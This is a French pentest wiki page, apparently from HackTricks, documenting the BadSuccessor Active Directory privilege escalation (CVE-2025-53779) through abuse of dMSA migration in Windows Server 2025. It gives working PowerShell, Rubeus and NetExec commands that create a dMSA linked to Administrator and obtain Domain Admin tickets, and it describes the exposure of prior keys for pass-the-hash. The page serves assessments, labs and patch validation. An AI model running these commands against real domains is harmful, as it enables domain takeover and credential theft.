# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

**BadSuccessor** abuse du workflow de migration des **Managed Service Account délégués** (**dMSA**), introduit dans **Windows Server 2025**. Un dMSA peut être lié à un compte legacy via **`msDS-ManagedAccountPrecededByLink`** et passer par les états de migration stockés dans **`msDS-DelegatedMSAState`**. Si un attaquant peut créer un dMSA dans une OU inscriptible et contrôler ces attributs, le KDC peut émettre des tickets pour le dMSA contrôlé par l’attaquant avec le **contexte d’autorisation du compte lié**.<sup>[[2]](#references)</sup>

En pratique, cela signifie qu’un utilisateur disposant de faibles privilèges, mais uniquement de droits OU délégués, peut créer un nouveau dMSA, le pointer vers `Administrator`, terminer l’état de migration, puis obtenir un TGT dont le PAC contient des groupes privilégiés tels que **Domain Admins**.<sup>[[2]](#references)</sup>

## Détails de la migration dMSA importants

- dMSA est une fonctionnalité de **Windows Server 2025**.
- `Start-ADServiceAccountMigration` définit la migration à l’état **started**.
- `Complete-ADServiceAccountMigration` définit la migration à l’état **completed**.
- `msDS-DelegatedMSAState = 1` signifie que la migration a démarré.
- `msDS-DelegatedMSAState = 2` signifie que la migration est terminée.
- Pendant une migration légitime, le dMSA est censé remplacer de manière transparente le compte remplacé, afin que le KDC/LSA préserve les accès dont disposait déjà l’ancien compte.<sup>[[3]](#references)</sup>

Microsoft Learn indique également que, pendant la migration, le compte d’origine est lié au dMSA et que le dMSA est censé accéder aux mêmes ressources que l’ancien compte.<sup>[[3]](#references)</sup> C’est cette hypothèse de sécurité que BadSuccessor abuse.<sup>[[2]](#references)</sup>

## Prérequis

1. Un domaine dans lequel **dMSA existe**, ce qui signifie que la prise en charge de **Windows Server 2025** est présente côté AD.
2. L’attaquant peut **créer** des objets `msDS-DelegatedManagedServiceAccount` dans une OU, ou dispose de droits équivalents et étendus de création d’objets enfants.
3. L’attaquant peut **écrire** les attributs dMSA concernés ou contrôler entièrement le dMSA qu’il vient de créer.
4. L’attaquant peut demander des tickets Kerberos depuis un contexte joint au domaine ou via un tunnel qui atteint LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Vérifications pratiques

Le signal le plus fiable pour l’opérateur consiste à vérifier le niveau du domaine/de la forêt et à confirmer que l’environnement utilise déjà la nouvelle stack Server 2025 :
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Si vous voyez des valeurs telles que `Windows2025Domain` et `Windows2025Forest`, considérez **BadSuccessor / dMSA migration abuse** comme un contrôle prioritaire.

Vous pouvez également énumérer les OUs inscriptibles déléguées pour la création de dMSA avec des outils publics :<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Déroulement de l’abus

1. Create a dMSA in an OU where you have delegated create-child rights.
2. Set **`msDS-ManagedAccountPrecededByLink`** to the DN of a privileged target such as `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Set **`msDS-DelegatedMSAState`** to `2` to mark the migration as completed.
4. Request a TGT for the new dMSA and use the returned ticket to access privileged services.<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Exemples de demandes de tickets / d'outils opérationnels:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Pourquoi cela va au-delà de la privilege escalation

Lors d'une migration légitime, Windows doit également permettre au nouveau dMSA de gérer les tickets émis pour l'ancien compte avant le basculement. C'est pourquoi le matériel des tickets liés au dMSA peut inclure les clés **actuelles** et **précédentes** dans le flux **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Pour une fausse migration contrôlée par un attaquant, ce comportement peut transformer BadSuccessor en :<sup>[[2]](#references)</sup>

- **Privilege escalation** par héritage des SID de groupes privilégiés dans le PAC.
- **Exposition de matériel d'authentification**, car la gestion des clés précédentes peut exposer un matériel équivalent au hash RC4/NT du compte prédécesseur dans les workflows vulnérables.

Cela rend cette technique utile à la fois pour une prise de contrôle directe du domaine et pour des opérations ultérieures telles que pass-the-hash ou une compromission plus large des identifiants.

## Notes sur l'état des correctifs

Le comportement original de BadSuccessor n'est **pas seulement un problème théorique lié à une preview de 2025**. Microsoft lui a attribué **CVE-2025-53779** et a publié une mise à jour de sécurité en **août 2025**.<sup>[[4]](#references)</sup> Conservez cette attaque dans la documentation pour :

- **labs / CTFs / exercices assume-breach**
- **environnements Windows Server 2025 non corrigés**
- **validation des délégations d'OU et de l'exposition des dMSA lors des assessments**

Ne supposez pas qu'un domaine Windows Server 2025 est vulnérable simplement parce que dMSA existe ; vérifiez le niveau de correctif et effectuez les tests avec précaution.

## Outils

- [Outils BadSuccessor d'Akamai](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Module `badsuccessor` de NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## Références

- [1] [HTB : Eighteen - Abus de dMSA avec BadSuccessor jusqu'à Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor : Abus de dMSA pour effectuer une privilege escalation dans Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Présentation des Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
